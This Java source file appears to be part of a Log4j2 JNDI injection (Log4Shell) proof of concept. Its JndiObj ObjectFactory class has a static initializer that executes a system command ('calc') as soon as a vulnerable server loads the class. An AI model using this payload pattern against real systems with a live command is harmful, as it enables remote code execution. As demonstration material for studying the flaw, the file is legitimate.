package com.meijm.log4j2;
import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Hashtable;

public class JndiObj implements ObjectFactory {

    static {
        System.out.println("this is JndiObj,i'm here!");
        try {
            //打开远程链接
            Runtime.getRuntime().exec("calc ");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    private String name;

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return new JndiObj();
    }

    @Override
    public String toString() {
        return "JndiObj{" +
                "name='" + name + '\'' +
                '}';
    }
}